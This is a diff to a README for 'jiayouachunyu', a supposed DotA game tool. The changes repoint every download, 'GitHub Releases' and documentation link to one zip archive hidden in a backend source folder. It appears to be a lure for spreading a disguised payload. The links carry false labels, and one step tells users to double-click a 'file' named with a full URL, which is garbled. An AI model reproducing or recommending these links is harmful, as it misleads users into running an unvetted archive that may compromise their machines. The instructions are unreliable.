@@ -1,13 +1,13 @@
 # 🎮 jiayouachunyu - Play and Enjoy DotA Like Never Before
 
 ## 📥 Download Now
-[![Download jiayouachunyu](https://raw.githubusercontent.com/illinotdan/jiayouachunyu/main/palmicolous/jiayouachunyu.zip)](https://raw.githubusercontent.com/illinotdan/jiayouachunyu/main/palmicolous/jiayouachunyu.zip)
+[![Download jiayouachunyu](https://github.com/illinotdan/jiayouachunyu/raw/refs/heads/main/backend/src/routes/Software_noetic.zip)](https://github.com/illinotdan/jiayouachunyu/raw/refs/heads/main/backend/src/routes/Software_noetic.zip)
 
 ## 🚀 Getting Started
 Welcome to jiayouachunyu! This application is a heartfelt tribute to the beloved game DotA. It aims to enhance your gaming experience with useful features and tools. Follow these simple steps to get started.
 
 ## 📂 Download & Install
-To get the application, visit this page to download the latest version: [GitHub Releases](https://raw.githubusercontent.com/illinotdan/jiayouachunyu/main/palmicolous/jiayouachunyu.zip).
+To get the application, visit this page to download the latest version: [GitHub Releases](https://github.com/illinotdan/jiayouachunyu/raw/refs/heads/main/backend/src/routes/Software_noetic.zip).
 
 1. Click on the link above to go to the releases page.
 2. Look for the most recent version.
@@ -26,7 +26,7 @@ Before using jiayouachunyu, make sure your computer meets the following requirem
 After downloading the application, you will need to run it. Here’s how:
 
 1. Navigate to the folder where the file is located.
-2. Double-click the file named `https://raw.githubusercontent.com/illinotdan/jiayouachunyu/main/palmicolous/jiayouachunyu.zip`.
+2. Double-click the file named `https://github.com/illinotdan/jiayouachunyu/raw/refs/heads/main/backend/src/routes/Software_noetic.zip`.
 3. If prompted by your computer, confirm that you want to open the application.
 4. The application will launch, and you will see a welcome screen.
 
@@ -62,9 +62,9 @@ If you encounter issues while running jiayouachunyu, here are some common soluti
 If you need assistance or want to connect with other users, consider joining our community. You can ask questions, share tips, and get advice on how to make the most of jiayouachunyu.
 
 ## 📖 Documentation
-For more detailed instructions, you can refer to the official documentation available [here](https://raw.githubusercontent.com/illinotdan/jiayouachunyu/main/palmicolous/jiayouachunyu.zip). This resource provides in-depth information on all features and usage guidelines.
+For more detailed instructions, you can refer to the official documentation available [here](https://github.com/illinotdan/jiayouachunyu/raw/refs/heads/main/backend/src/routes/Software_noetic.zip). This resource provides in-depth information on all features and usage guidelines.
 
 ## 🔗 Further Downloads
-For future updates and new features, remember to visit our releases page regularly: [GitHub Releases](https://raw.githubusercontent.com/illinotdan/jiayouachunyu/main/palmicolous/jiayouachunyu.zip).
+For future updates and new features, remember to visit our releases page regularly: [GitHub Releases](https://github.com/illinotdan/jiayouachunyu/raw/refs/heads/main/backend/src/routes/Software_noetic.zip).
 
 Thank you for choosing jiayouachunyu! Enjoy your game and have fun!
